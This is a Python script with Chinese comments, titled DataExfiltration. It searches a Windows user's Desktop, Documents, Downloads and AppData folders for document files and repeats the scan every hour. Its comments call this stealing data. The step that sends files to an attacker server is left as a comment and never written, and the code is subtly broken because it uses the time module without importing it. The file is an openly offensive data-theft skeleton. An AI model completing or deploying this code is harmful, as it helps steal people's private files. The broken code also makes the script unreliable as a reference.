import os
import shutil
import socket
import threading
from datetime import datetime

class DataExfiltration:
    def __init__(self, server_ip='127.0.0.1', server_port=4445):
        self.server_ip = server_ip
        self.server_port = server_port
        self.target_files = ['%USERPROFILE%\\Desktop\\*.txt', '%USERPROFILE%\\Documents\\*.doc*', '%USERPROFILE%\\Downloads\\*.pdf', '%APPDATA%\\*\\*.config']
    
    def find_sensitive_files(self):
        """查找敏感文件"""
        sensitive_files = []
        
        for pattern in self.target_files:
            expanded_pattern = os.path.expandvars(pattern)
            
            if '*' in expanded_pattern:
                # 通配符匹配
                directory = os.path.dirname(expanded_pattern)
                if os.path.exists(directory):
                    for file in os.listdir(directory):
                        if file.lower().endswith(tuple(['.txt', '.doc', '.docx', '.pdf', '.xls', '.xlsx'])):
                            full_path = os.path.join(directory, file)
                            if os.path.isfile(full_path):
                                sensitive_files.append(full_path)
            else:
                # 具体文件
                if os.path.exists(expanded_pattern):
                    sensitive_files.append(expanded_pattern)
        
        return sensitive_files
    
    def exfiltrate_data(self):
        """窃取数据"""
        files = self.find_sensitive_files()
        
        print(f"找到 {len(files)} 个文件")
        
        for file_path in files:
            try:
                # 这里应该是发送到远程服务器的逻辑
                # 演示目的，只打印文件信息
                file_size = os.path.getsize(file_path)
                print(f"文件: {file_path} ({file_size} bytes)")
                
                # 实际攻击中，这里会发送文件内容到攻击者服务器
                
            except Exception as e:
                print(f"处理文件失败: {file_path} - {e}")
    
    def start_monitoring(self):
        """开始监控"""
        while True:
            self.exfiltrate_data()
            time.sleep(3600)  # 每小时执行一次

if __name__ == "__main__":
    exfil = DataExfiltration()
    exfil.start_monitoring()
